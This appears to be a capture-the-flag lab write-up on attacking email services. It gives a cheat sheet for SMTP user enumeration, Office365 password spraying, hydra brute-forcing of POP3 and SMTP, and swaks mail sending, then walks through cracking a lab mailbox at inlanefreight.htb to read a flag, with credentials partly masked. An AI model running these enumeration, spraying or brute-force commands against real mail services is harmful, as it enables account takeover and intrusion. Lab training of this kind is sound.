# Attacking Email Services

| Command                                                                                     | Description                                                                      |
| ------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| ```host -t MX microsoft.com```                                                                  | DNS lookup for mail servers for the specified domain.                            |
| ```dig mx example.com \| grep "MX" \| grep -v ";"```                                     | DNS lookup for mail servers for the specified domain.                            |
| ```host -t A mail1.example.com.```                                                        | DNS lookup of the IPv4 address for the specified subdomain.                      |
| ```telnet $TARGET_IP 25```                                                                    | Connect to the SMTP server.                                                      |
| ```smtp-user-enum -M RCPT -U userlist.txt -D example.com -t $TARGET_IP```               | SMTP user enumeration using the RCPT command against the specified host.         |
| ```python3 o365spray.py --validate --domain msplaintext.xyz```                                  | Verify the usage of Office365 for the specified domain.                          |
| ```python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz```                         | Enumerate existing users using Office365 on the specified domain.                |
| ```python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz``` | Password spraying against a list of users that use Office365 for the specified domain. |
| ```hydra -L users.txt -p 'Company01!' -f $TARGET_IP pop3```                                   | Brute-forcing the POP3 service.                                                  |
| ```swaks --from notifications@example.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server $TARGET_IP``` | Send email using SWAKS (Swiss Army Knife for SMTP).                               |


## Questions:
1. What is the available username for the domain `inlanefreight.htb` in the SMTP server?
2. Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.

## Steps:

### 1. Edit the Hosts File
First, add the target IP and domain to the `/etc/hosts` file for easier access:
```
sudo nano /etc/hosts
```

Add the following line with target IP:

`10.129.215.105 inlanefreight.htb`

### 2. Download Users and Passwords Lists from resources
### 3. Enumerate SMTP Users

Use smtp-user-enum to find valid users in the SMTP server:
```
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t $TARGET_IP
```
This reveals the user:
` m*****@inlanefreight.htb `
### 4. Brute-force the Password
Use hydra to brute-force the password for the discovered user:

```
hydra -l m*****@inlanefreight.htb -P pswd.txt -f 10.129.215.105 smtp
```

The password is found:
`po*****r`

### 5. Access the Email Account
Use telnet to access the POP3 service and read emails:
```
telnet $TARGET_IP 110
```
Log in with the credentials:

```
user m*****@inlanefreight.htb
+OK Send your password
pass po*****r
+OK Mailbox locked and ready
```
### 6. List and Read the Email
List the emails in the mailbox:
```
list
+OK 1 messages (601 octets)
1 601
Read the email:
retr 1
Output:
Return-Path: m*****@inlanefreight.htb
Received: from [10.10.14.33] (Unknown [10.10.14.33])
by WINSRV02 with ESMTPA
; Wed, 20 Apr 2022 14:49:32 -0500
Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
Subject: Password change
From: marlin <m*****@inlanefreight.htb>
To: administrator@inlanefreight.htb
Cc: m*****@inlanefreight.htb
Date: Wed, 20 Apr 2022 15:49:11 -0400
Content-Type: text/plain; charset="UTF-8"
User-Agent: Evolution 3.38.3-1
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Hi admin,

How can I change my password to something more secure?

flag: HTB{w**k_p******d}
```


